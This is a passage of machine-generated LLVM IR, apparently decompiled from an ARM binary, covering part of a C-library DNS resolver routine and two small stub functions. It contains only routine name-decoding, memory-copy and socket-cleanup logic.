  %v4_1d28c = and i32 %v3_1d28c, %v0_1d28c
  %v5_1d28c = icmp slt i32 %v4_1d28c, 0
  %v6_1d28c = icmp slt i32 %v1_1d28c, 0
  %v7_1d28c = icmp eq i32 %v0_1d28c, 3
  %v3_1d290 = xor i1 %v6_1d28c, %v5_1d28c
  %v4_1d290 = or i1 %v7_1d28c, %v3_1d290
  br i1 %v4_1d290, label %dec_label_pc_1d520, label %dec_label_pc_1d294

dec_label_pc_1d294:                               ; preds = %dec_label_pc_1d28c
  %v1_1d294 = sub i32 -8, %v0_1d240.pre
  %v2_1d298 = add i32 %v1_1d298, %v1_1d294
  %v3_1d298 = icmp ult i32 %v2_1d298, %v1_1d294
  store i1 %v3_1d298, i1* %cpsr_c.global-to-local, align 1
  %v8_1d298 = icmp slt i32 %v2_1d298, 0
  br i1 %v8_1d298, label %dec_label_pc_1d520, label %dec_label_pc_1d2bc

dec_label_pc_1d2bc:                               ; preds = %dec_label_pc_1d294
  %v2_1d2a4 = add i32 %v2_1d298, 12
  store i32 %v2_1d2a4, i32* %r1.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1d4f461, label %dec_label_pc_1d2d0, label %dec_label_pc_1d4f8

dec_label_pc_1d2d0:                               ; preds = %dec_label_pc_1d2bc, %dec_label_pc_1d4d0.dec_label_pc_1d2d0_crit_edge
  %v0_1d2d4 = phi i32 [ %v0_1d2d4.pre, %dec_label_pc_1d4d0.dec_label_pc_1d2d0_crit_edge ], [ %v0_1d240.pre, %dec_label_pc_1d2bc ]
  %stack_var_-456.369 = phi i32 [ %v2_1d4d8, %dec_label_pc_1d4d0.dec_label_pc_1d2d0_crit_edge ], [ %v2_1d2a4, %dec_label_pc_1d2bc ]
  %stack_var_-448.066 = phi i32 [ %v1_1d4dc, %dec_label_pc_1d4d0.dec_label_pc_1d2d0_crit_edge ], [ 0, %dec_label_pc_1d2bc ]
  %stack_var_-476.265 = phi i32 [ %stack_var_-476.1, %dec_label_pc_1d4d0.dec_label_pc_1d2d0_crit_edge ], [ 1, %dec_label_pc_1d2bc ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-456.369, i32* @r1, align 4
  %v5_1d2e8 = call i32 @__decode_dotted(i32 %v0_1d2d4, i32 %stack_var_-456.369, i32 %v6_1d170, i32 %v2_1d2e0, i32 256)
  store i32 %v5_1d2e8, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d2ec = icmp slt i32 %v5_1d2e8, 0
  br i1 %v1_1d2ec, label %dec_label_pc_1d3b4, label %dec_label_pc_1d2f4

dec_label_pc_1d2f4:                               ; preds = %dec_label_pc_1d2d0
  store i32 %stack_var_-456.369, i32* %r1.global-to-local, align 4
  %v1_1d2fc = add i32 %v5_1d2e8, 10
  store i32 %v1_1d2fc, i32* @sb, align 4
  %v2_1d300 = sub i32 %v6_1d170, %stack_var_-456.369
  %v2_1d304 = sub i32 %v2_1d300, %v1_1d2fc
  %v3_1d304 = icmp uge i32 %v2_1d300, %v1_1d2fc
  store i1 %v3_1d304, i1* %cpsr_c.global-to-local, align 1
  %v8_1d304 = icmp slt i32 %v2_1d304, 0
  br i1 %v8_1d304, label %dec_label_pc_1d3ac.thread, label %dec_label_pc_1d314

dec_label_pc_1d3ac.thread:                        ; preds = %dec_label_pc_1d2f4
  store i32 %v2_1d304, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1d3b4

dec_label_pc_1d314:                               ; preds = %dec_label_pc_1d2f4
  %v2_1d318 = call i32 @__GI_strdup(i8* %v1_1d318)
  %v0_1d320 = load i32, i32* @r4, align 4
  %v2_1d320 = add i32 %v0_1d320, %stack_var_-456.369
  %v0_1d324 = load i32, i32* @sl, align 4
  %v2_1d324 = add i32 %v0_1d324, %v2_1d320
  store i32 %v2_1d324, i32* %r1.global-to-local, align 4
  %v1_1d328 = add i32 %v2_1d324, 2
  store i32 %v1_1d328, i32* %ip.global-to-local, align 4
  %v1_1d334 = add i32 %v2_1d324, 5
  %v2_1d334 = inttoptr i32 %v1_1d334 to i8*
  %v3_1d334 = load i8, i8* %v2_1d334, align 1
  %v4_1d334 = zext i8 %v3_1d334 to i32
  store i32 %v4_1d334, i32* @r8, align 4
  %v1_1d338 = add i32 %v2_1d324, 6
  %v2_1d338 = inttoptr i32 %v1_1d338 to i8*
  %v3_1d338 = load i8, i8* %v2_1d338, align 1
  %v4_1d338 = zext i8 %v3_1d338 to i32
  %v1_1d340 = add i32 %v2_1d324, 8
  %v2_1d340 = inttoptr i32 %v1_1d340 to i8*
  %v3_1d340 = load i8, i8* %v2_1d340, align 1
  %v4_1d340 = zext i8 %v3_1d340 to i32
  store i32 %v4_1d340, i32* @r7, align 4
  %v1_1d344 = add i32 %v2_1d324, 9
  %v2_1d344 = inttoptr i32 %v1_1d344 to i8*
  %v3_1d344 = load i8, i8* %v2_1d344, align 1
  %v4_1d344 = zext i8 %v3_1d344 to i32
  store i32 %v4_1d338, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v1_1d364 = add i32 %v2_1d324, 1
  %v2_1d364 = inttoptr i32 %v1_1d364 to i8*
  %v3_1d364 = load i8, i8* %v2_1d364, align 1
  %v4_1d364 = zext i8 %v3_1d364 to i32
  %v3_1d368 = inttoptr i32 %v2_1d324 to i8*
  %v4_1d368 = load i8, i8* %v3_1d368, align 1
  %v6_1d368 = zext i8 %v4_1d368 to i32
  store i32 %v6_1d368, i32* @r5, align 4
  store i32 %v2_1d304, i32* @ip, align 4
  %v4_1d374 = mul nuw nsw i32 %v4_1d340, 256
  %v5_1d374 = or i32 %v4_1d344, %v4_1d374
  store i32 %v5_1d374, i32* @r6, align 4
  %v4_1d378 = mul nuw nsw i32 %v6_1d368, 256
  %v5_1d378 = or i32 %v4_1d378, %v4_1d364
  store i32 %v5_1d378, i32* @lr, align 4
  %v1_1d37c = add i32 %v2_1d324, 10
  store i32 %v1_1d37c, i32* %r1.global-to-local, align 4
  %v1_1d380 = add i32 %v2_1d320, 10
  store i32 %v1_1d380, i32* @r4, align 4
  %v2_1d384 = sub i32 %v2_1d304, %v5_1d374
  %v3_1d384 = icmp uge i32 %v2_1d304, %v5_1d374
  store i1 %v3_1d384, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = sub i32 0, %v2_1d384
  %v6_1d384 = and i32 %v2_1d304, %tmp223
  %v7_1d384 = icmp slt i32 %v6_1d384, 0
  %v8_1d384 = icmp slt i32 %v2_1d384, 0
  store i32 %v2_1d318, i32* %stack_var_-140, align 4
  %v2_1d3a4 = xor i1 %v8_1d384, %v7_1d384
  br i1 %v2_1d3a4, label %dec_label_pc_1d3b4, label %dec_label_pc_1d3ac

dec_label_pc_1d3ac:                               ; preds = %dec_label_pc_1d314
  %v0_1d3a8 = load i32, i32* @sb, align 4
  %v2_1d3a8 = add i32 %v0_1d3a8, %v5_1d374
  store i32 %v2_1d3a8, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d3ac = icmp slt i32 %v2_1d3a8, 0
  br i1 %v1_1d3ac, label %dec_label_pc_1d3b4, label %dec_label_pc_1d3d0

dec_label_pc_1d3b4:                               ; preds = %dec_label_pc_1d3ac, %dec_label_pc_1d314, %dec_label_pc_1d2d0, %dec_label_pc_1d3ac.thread
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d3b8 = icmp eq i32 %stack_var_-448.066, 0
  br i1 %v2_1d3b8, label %dec_label_pc_1d520, label %dec_label_pc_1d3c0

dec_label_pc_1d3c0:                               ; preds = %dec_label_pc_1d3b4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1d3c4, label %dec_label_pc_1d520, label %dec_label_pc_1d4f8

dec_label_pc_1d3d0:                               ; preds = %dec_label_pc_1d3ac
  store i32 %stack_var_-476.265, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d3d4 = icmp eq i32 %stack_var_-476.265, 0
  br i1 %v2_1d3d4, label %dec_label_pc_1d478, label %dec_label_pc_1d3dc

dec_label_pc_1d3dc:                               ; preds = %dec_label_pc_1d3d0
  %v0_1d3dc = load i32, i32* @fp, align 4
  %v3_1d3e0 = add i32 %v0_1d3dc, 32
  %v4_1d3e0 = inttoptr i32 %v3_1d3e0 to i32*
  %v5_1d3e0 = load i32, i32* %v4_1d3e0, align 4
  store i32 %v5_1d3e0, i32* @ip, align 4
  %v6_1d3e0 = add i32 %v0_1d3dc, 36
  %v7_1d3e0 = inttoptr i32 %v6_1d3e0 to i32*
  %v8_1d3e0 = load i32, i32* %v7_1d3e0, align 4
  store i32 %v8_1d3e0, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_1d3dc, i32* @r0, align 4
  store i32 %v2_1d3ec, i32* @r1, align 4
  %v0_1d3fc = call i32 @memcpy()
  %v0_1d400 = load i32, i32* @fp, align 4
  %v1_1d400 = add i32 %v0_1d400, 4
  %v2_1d400 = inttoptr i32 %v1_1d400 to i32*
  %v3_1d400 = load i32, i32* %v2_1d400, align 4
  %v2_1d404 = icmp ugt i32 %v3_1d400, 23
  store i1 %v2_1d404, i1* %cpsr_c.global-to-local, align 1
  %v7_1d404 = icmp eq i32 %v3_1d400, 24
  br i1 %v7_1d404, label %dec_label_pc_1d428, label %dec_label_pc_1d40c

dec_label_pc_1d40c:                               ; preds = %dec_label_pc_1d3dc
  %v1_1d40c = add i32 %v0_1d400, 28
  %v2_1d40c = inttoptr i32 %v1_1d40c to i32*
  %v3_1d40c = load i32, i32* %v2_1d40c, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d410 = icmp eq i32 %v3_1d40c, 0
  br i1 %v2_1d410, label %dec_label_pc_1d4f8, label %dec_label_pc_1d418

dec_label_pc_1d418:                               ; preds = %dec_label_pc_1d40c
  store i1 %v2_1d41c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1d41c, label %dec_label_pc_1d428, label %bb224

bb224:                                            ; preds = %dec_label_pc_1d418
  store i1 %v3_1d420, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_1d420, label %dec_label_pc_1d428, label %dec_label_pc_1d4f8

dec_label_pc_1d428:                               ; preds = %dec_label_pc_1d418, %bb224, %dec_label_pc_1d3dc
  store i32 %v0_1ce60, i32* @ip, align 4
  %v3_1d42c = icmp uge i32 %v3_1d400, %v0_1ce60
  store i1 %v3_1d42c, i1* %cpsr_c.global-to-local, align 1
  %v9_1d42c = icmp eq i32 %v3_1d400, %v0_1ce60
  br i1 %v9_1d42c, label %dec_label_pc_1d43c, label %bb225

bb225:                                            ; preds = %dec_label_pc_1d428
  br label %dec_label_pc_1d4d0

dec_label_pc_1d43c:                               ; preds = %dec_label_pc_1d428
  store i32 %stack_var_-448.066, i32* %r1.global-to-local, align 4
  %v1_1d444 = add i32 %v0_1d400, 16
  %v2_1d444 = inttoptr i32 %v1_1d444 to i32*
  %v3_1d444 = load i32, i32* %v2_1d444, align 4
  %v2_1d448 = sub i32 %tmp164, %stack_var_-448.066
  %v1_1d44c = add i32 %v2_1d448, -1
  %v1_1d450 = add i32 %v3_1d444, 4
  %v2_1d454 = mul i32 %v1_1d450, %v1_1d44c
  store i32 %v2_1d454, i32* %r1.global-to-local, align 4
  %v1_1d458 = add i32 %v0_1d400, 32
  %v2_1d458 = inttoptr i32 %v1_1d458 to i32*
  %v3_1d458 = load i32, i32* %v2_1d458, align 4
  %v3_1d45c = icmp uge i32 %v2_1d454, %v3_1d458
  store i1 %v3_1d45c, i1* %cpsr_c.global-to-local, align 1
  %v2_1d460 = add i32 %v0_1d400, 36
  %v3_1d460 = inttoptr i32 %v2_1d460 to i32*
  store i32 %v1_1d44c, i32* %v3_1d460, align 4
  %tmp283 = icmp ugt i32 %v2_1d454, %v3_1d458
  br i1 %tmp283, label %dec_label_pc_1d4f8, label %dec_label_pc_1d468

dec_label_pc_1d468:                               ; preds = %dec_label_pc_1d43c
  %v1_1d470 = load i32, i32* @fp, align 4
  %v2_1d470 = add i32 %v1_1d470, 36
  %v3_1d470 = inttoptr i32 %v2_1d470 to i32*
  store i32 0, i32* %v3_1d470, align 4
  br label %dec_label_pc_1d4d0

dec_label_pc_1d478:                               ; preds = %dec_label_pc_1d3d0
  store i32 %v2_1d318, i32* @r0, align 4
  %v0_1d47c = call i32 @free()
  store i32 %v0_1ce60, i32* @ip, align 4
  %v3_1d488 = icmp uge i32 %v5_1d378, %v0_1ce60
  store i1 %v3_1d488, i1* %cpsr_c.global-to-local, align 1
  %v9_1d488 = icmp eq i32 %v5_1d378, %v0_1ce60
  br i1 %v9_1d488, label %dec_label_pc_1d490, label %dec_label_pc_1d4d0

dec_label_pc_1d490:                               ; preds = %dec_label_pc_1d478
  %v0_1d490 = load i32, i32* @fp, align 4
  %v1_1d490 = add i32 %v0_1d490, 16
  %v2_1d490 = inttoptr i32 %v1_1d490 to i32*
  %v3_1d490 = load i32, i32* %v2_1d490, align 4
  store i32 %v3_1d490, i32* %r1.global-to-local, align 4
  %v3_1d498 = icmp uge i32 %v3_1d490, %v5_1d374
  store i1 %v3_1d498, i1* %cpsr_c.global-to-local, align 1
  %v9_1d498 = icmp eq i32 %v3_1d490, %v5_1d374
  br i1 %v9_1d498, label %dec_label_pc_1d4ac, label %dec_label_pc_1d4a0

dec_label_pc_1d4a0:                               ; preds = %dec_label_pc_1d490
  %v1_1d4a0 = inttoptr i32 %v0_1d490 to i32*
  %v2_1d4a0 = load i32, i32* %v1_1d4a0, align 4
  store i32 %v2_1d4a0, i32* @r0, align 4
  %v0_1d4a4 = call i32 @free()
  br label %dec_label_pc_1d520

dec_label_pc_1d4ac:                               ; preds = %dec_label_pc_1d490
  %v1_1d4ac = add i32 %v0_1d490, 36
  %v2_1d4ac = inttoptr i32 %v1_1d4ac to i32*
  %v3_1d4ac = load i32, i32* %v2_1d4ac, align 4
  %v1_1d4b0 = add i32 %v0_1d490, 28
  %v2_1d4b0 = inttoptr i32 %v1_1d4b0 to i32*
  %v3_1d4b0 = load i32, i32* %v2_1d4b0, align 4
  %v3_1d4b4 = mul i32 %v3_1d4ac, %v5_1d374
  %v4_1d4b4 = add i32 %v3_1d4b0, %v3_1d4b4
  store i32 %v4_1d4b4, i32* @r0, align 4
  store i32 %v5_1d374, i32* @r2, align 4
  store i32 %v1_1d37c, i32* @r1, align 4
  %v0_1d4c0 = call i32 @memcpy()
  %v0_1d4c4 = load i32, i32* @fp, align 4
  %v1_1d4c4 = add i32 %v0_1d4c4, 36
  %v2_1d4c4 = inttoptr i32 %v1_1d4c4 to i32*
  %v3_1d4c4 = load i32, i32* %v2_1d4c4, align 4
  %v1_1d4c8 = add i32 %v3_1d4c4, 1
  store i32 %v1_1d4c8, i32* %v2_1d4c4, align 4
  br label %dec_label_pc_1d4d0

dec_label_pc_1d4d0:                               ; preds = %bb225, %dec_label_pc_1d478, %dec_label_pc_1d468, %dec_label_pc_1d4ac
  %stack_var_-476.1 = phi i32 [ 0, %dec_label_pc_1d4ac ], [ 0, %dec_label_pc_1d478 ], [ 0, %dec_label_pc_1d468 ], [ 1, %bb225 ]
  %v1_1d4d8 = load i32, i32* @r4, align 4
  %v1_1d4dc = add nuw nsw i32 %stack_var_-448.066, 1
  store i32 %v1_1d4dc, i32* %r1.global-to-local, align 4
  %v3_1d4f0 = icmp uge i32 %v1_1d4dc, %tmp164
  store i1 %v3_1d4f0, i1* %cpsr_c.global-to-local, align 1
  %v5_1d4f4 = icmp slt i32 %v1_1d4dc, %tmp164
  br i1 %v5_1d4f4, label %dec_label_pc_1d4d0.dec_label_pc_1d2d0_crit_edge, label %dec_label_pc_1d4f8

dec_label_pc_1d4d0.dec_label_pc_1d2d0_crit_edge:  ; preds = %dec_label_pc_1d4d0
  %v2_1d4d8 = add i32 %v1_1d4d8, %stack_var_-456.369
  %v0_1d2d4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1d2d0

dec_label_pc_1d4f8:                               ; preds = %dec_label_pc_1d3c0, %dec_label_pc_1d2bc, %dec_label_pc_1d4d0, %dec_label_pc_1d40c, %dec_label_pc_1d43c, %bb224
  %v1_1d4fc = call i32 @__GI_close(i32 %v0_1d0e8)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d504 = icmp eq i32 %arg3, 0
  br i1 %v2_1d504, label %.thread26, label %bb227

bb227:                                            ; preds = %dec_label_pc_1d4f8
  %v1_1d50c = load i32, i32* @sl, align 4
  %v3_1d508 = inttoptr i32 %arg3 to i32*
  store i32 %v1_1d50c, i32* %v3_1d508, align 4
  br label %bb228

.thread26:                                        ; preds = %dec_label_pc_1d4f8
  br label %bb228

bb228:                                            ; preds = %bb227, %.thread26
  store i32 120084, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1d504, i32 ptrtoint (i32* @global_var_16dac.1607 to i32))
  store i32 %v1_1cea0, i32* @r0, align 4
  %v0_1d518 = call i32 @free()
  br label %dec_label_pc_1d588

dec_label_pc_1d520:                               ; preds = %thread-pre-split, %dec_label_pc_1d138, %dec_label_pc_1d294, %dec_label_pc_1d28c, %dec_label_pc_1d23c, %dec_label_pc_1d248, %dec_label_pc_1d254thread-pre-split, %thread-pre-split.thread, %dec_label_pc_1d20c, %dec_label_pc_1d3c0, %dec_label_pc_1d3b4, %dec_label_pc_1d0f8, %dec_label_pc_1d0d4, %dec_label_pc_1d4a0
  %v1_1d524 = add i32 %v0_1d008, 1
  store i32 %v1_1d524, i32* @ip, align 4
  br label %dec_label_pc_1d530

dec_label_pc_1d530:                               ; preds = %.thread12, %dec_label_pc_1d520
  %storemerge27 = phi i32 [ -1, %dec_label_pc_1d520 ], [ %v7_1d1f8, %.thread12 ]
  %stack_var_-464.2 = phi i32 [ %v1_1d524, %dec_label_pc_1d520 ], [ %v0_1d008, %.thread12 ]
  store i32 %storemerge27, i32* @sb, align 4
  %v1_1d534 = add i32 %stack_var_-472.1, -1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp229 = icmp slt i32 %v1_1d534, 1
  br i1 %tmp229, label %dec_label_pc_1d550, label %dec_label_pc_1cf0c

dec_label_pc_1d548:                               ; preds = %dec_label_pc_1d0a8, %bb216, %bb211, %.thread10, %dec_label_pc_1cebc
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d550

dec_label_pc_1d550:                               ; preds = %dec_label_pc_1d530, %.thread138, %dec_label_pc_1d548
  %stack_var_-468.1 = phi i32 [ %v1_1cea0, %dec_label_pc_1d548 ], [ 0, %.thread138 ], [ %v1_1cea0, %dec_label_pc_1d530 ]
  %stack_var_-484.2 = phi i32 [ -1, %dec_label_pc_1d548 ], [ -1, %.thread138 ], [ %v0_1d0e8, %dec_label_pc_1d530 ]
  %v0_1d550 = call i32 @__GI___h_errno_location()
  %v2_1d55c = icmp eq i32 %stack_var_-484.2, -1
  store i1 %v2_1d55c, i1* %cpsr_c.global-to-local, align 1
  %v7_1d55c = icmp eq i32 %stack_var_-484.2, -1
  %v2_1d560 = inttoptr i32 %v0_1d550 to i32*
  store i32 -1, i32* %v2_1d560, align 4
  br i1 %v7_1d55c, label %dec_label_pc_1d570, label %dec_label_pc_1d568

dec_label_pc_1d568:                               ; preds = %dec_label_pc_1d550, %dec_label_pc_1d234
  %stack_var_-468.2 = phi i32 [ %stack_var_-468.1, %dec_label_pc_1d550 ], [ %v1_1cea0, %dec_label_pc_1d234 ]
  %stack_var_-484.3 = phi i32 [ %stack_var_-484.2, %dec_label_pc_1d550 ], [ %v0_1d0e8, %dec_label_pc_1d234 ]
  %v1_1d56c = call i32 @__GI_close(i32 %stack_var_-484.3)
  br label %dec_label_pc_1d570

dec_label_pc_1d570:                               ; preds = %dec_label_pc_1d550, %dec_label_pc_1d568
  %stack_var_-468.3 = phi i32 [ %stack_var_-468.1, %dec_label_pc_1d550 ], [ %stack_var_-468.2, %dec_label_pc_1d568 ]
  store i32 %stack_var_-468.3, i32* @r0, align 4
  %v0_1d574 = call i32 @free()
  %v0_1d578 = load i32, i32* @sl, align 4
  store i32 %v0_1d578, i32* @r0, align 4
  %v0_1d57c = call i32 @free()
  br label %dec_label_pc_1d588

dec_label_pc_1d588:                               ; preds = %bb228, %dec_label_pc_1d570
  %stack_var_-480.0 = phi i32 [ -1, %dec_label_pc_1d570 ], [ %v6_1d170, %bb228 ]
  store i32 %v3_1ce4c, i32* @r4, align 4
  store i32 %v6_1ce4c, i32* @r5, align 4
  store i32 %v9_1ce4c, i32* @r6, align 4
  store i32 %v12_1ce4c, i32* @r7, align 4
  store i32 %v15_1ce4c, i32* @r8, align 4
  store i32 %v18_1ce4c, i32* @sb, align 4
  store i32 %v21_1ce4c, i32* @sl, align 4
  store i32 %v24_1ce4c, i32* @fp, align 4
  ret i32 %stack_var_-480.0

; uselistorder directives
  uselistorder i32 %stack_var_-484.2, { 1, 0, 2 }
  uselistorder i32 %stack_var_-468.1, { 1, 0 }
  uselistorder i32 %v1_1d534, { 1, 0 }
  uselistorder i32 %v1_1d4dc, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1d490, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1d44c, { 1, 0 }
  uselistorder i32 %v2_1d384, { 1, 0 }
  uselistorder i32 %v5_1d374, { 4, 0, 2, 3, 1, 6, 5, 7 }
  uselistorder i32 %v2_1d324, { 2, 3, 4, 5, 0, 1, 6, 7, 8 }
  uselistorder i32 %v2_1d320, { 1, 0 }
  uselistorder i32 %v2_1d304, { 0, 3, 2, 4, 1, 5 }
  uselistorder i32 %v2_1d300, { 1, 0 }
  uselistorder i32 %v1_1d2fc, { 1, 0, 2 }
  uselistorder i32 %stack_var_-448.066, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-456.369, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_1d28c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_1d268, { 1, 0 }
  uselistorder i32 %v3_1d25c, { 0, 2, 1 }
  uselistorder i32 %v0_1d25c, { 0, 2, 1 }
  uselistorder i32 %v2_1d24c, { 0, 2, 1 }
  uselistorder i32 %v1_1d180, { 1, 0 }
  uselistorder i32 %v0_1d180, { 1, 0 }
  uselistorder i32 %v6_1d170, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 %v0_1d150, { 2, 0, 1 }
  uselistorder i32 %v0_1d0e8, { 1, 0, 2, 7, 8, 5, 6, 4, 9, 10, 11, 3 }
  uselistorder i32 %v4_1d09c, { 1, 0, 2, 3 }
  uselistorder i8 %v5_1d004, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_1cff8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1d008, { 2, 1, 0, 3 }
  uselistorder i1 %v7_1cf10, { 1, 0 }
  uselistorder i32 %v2_1d058, { 1, 0, 2 }
  uselistorder i32 %v0_1cebc, { 1, 0, 2 }
  uselistorder i32 %v1_1cea0, { 7, 0, 4, 6, 5, 9, 8, 1, 2, 3, 10, 11, 12 }
  uselistorder i32 %v3_1ce74, { 7, 1, 2, 4, 3, 6, 5, 0, 8 }
  uselistorder i32 %v0_1ce60, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i8* %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32 %tmp164, { 2, 4, 0, 1, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 2, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 57, 22, 23, 24, 25, 26, 56, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 (i32)* @__GI_close, { 13, 12, 14, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 11, 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 23, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 -3, { 3, 0, 2, 4, 1, 7, 5, 6 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 6, 3 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 5, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @__libc_recv, { 3, 0, 1, 2, 4 }
  uselistorder i32 64, { 2, 0, 13, 16, 17, 10, 4, 5, 6, 7, 14, 15, 1, 11, 12, 3, 18, 8, 19, 9 }
  uselistorder i32 1000, { 8, 6, 3, 2, 1, 5, 4, 0, 7 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 10, 5, 6, 0, 1, 2, 3, 4, 7, 8, 9, 11 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 8, 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 ()* @socket, { 1, 13, 11, 10, 9, 8, 0, 7, 6, 5, 4, 3, 2, 12 }
  uselistorder i32 ()* @_pthread_cleanup_pop_restore, { 3, 11, 15, 8, 7, 6, 10, 9, 16, 5, 4, 14, 13, 12, 22, 21, 0, 18, 20, 19, 17, 2, 1 }
  uselistorder i8 1, { 0, 4, 1, 5, 6, 7, 8, 9, 27, 28, 25, 26, 23, 24, 22, 20, 21, 19, 16, 17, 18, 13, 14, 11, 12, 2, 3, 15, 10, 29, 30, 31 }
  uselistorder i8* @global_var_2e439.1731, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_return_0, { 8, 7, 17, 21, 14, 13, 12, 16, 15, 11, 22, 10, 9, 20, 19, 18, 29, 28, 3, 24, 27, 26, 23, 2, 1, 0, 5, 4, 6, 25 }
  uselistorder i32 ()* @_pthread_cleanup_push_defer, { 5, 4, 14, 18, 11, 10, 9, 13, 12, 8, 19, 7, 6, 17, 16, 15, 25, 24, 0, 21, 23, 22, 20, 2, 1, 3 }
  uselistorder i32 ptrtoint (i8* @global_var_18078.1329 to i32), { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 27, { 2, 3, 4, 1, 0, 5 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 512, { 4, 6, 3, 7, 2, 8, 9, 10, 11, 5, 0, 1 }
  uselistorder label %dec_label_pc_1d588, { 1, 0 }
  uselistorder label %dec_label_pc_1d570, { 1, 0 }
  uselistorder label %dec_label_pc_1d550, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d548, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1d530, { 1, 0 }
  uselistorder label %dec_label_pc_1d520, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %dec_label_pc_1d4f8, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_1d4d0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1d428, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d3b4, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1d2d0, { 1, 0 }
  uselistorder label %dec_label_pc_1d28c, { 1, 0 }
  uselistorder label %dec_label_pc_1d25c, { 1, 0 }
  uselistorder label %dec_label_pc_1d234, { 1, 0 }
  uselistorder label %dec_label_pc_1d180, { 1, 0, 2 }
  uselistorder label %bb216, { 1, 0 }
  uselistorder label %dec_label_pc_1cfd0, { 1, 0 }
  uselistorder label %dec_label_pc_1cf8c, { 1, 0 }
  uselistorder label %bb214, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1d594:
  %v0_1d594 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1d594, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1d594
  %v2_1d594 = load i32, i32* @lr, align 4
  %v4_1d594 = lshr i32 %v2_1d594, %arg2
  %v5_1d594 = sub i32 32, %arg2
  %v6_1d594 = shl i32 %v2_1d594, %v5_1d594
  %v7_1d594 = or i32 %v6_1d594, %v4_1d594
  %v9_1d594 = and i32 %v7_1d594, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1d594, %bb
  %v4_1d598 = phi i32 [ %arg1, %dec_label_pc_1d594 ], [ %v9_1d594, %bb ]
  ret i32 %v4_1d598

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2e1e4 to i32), i32* @lr, align 4
  call void @llvm.trap()
  unreachable

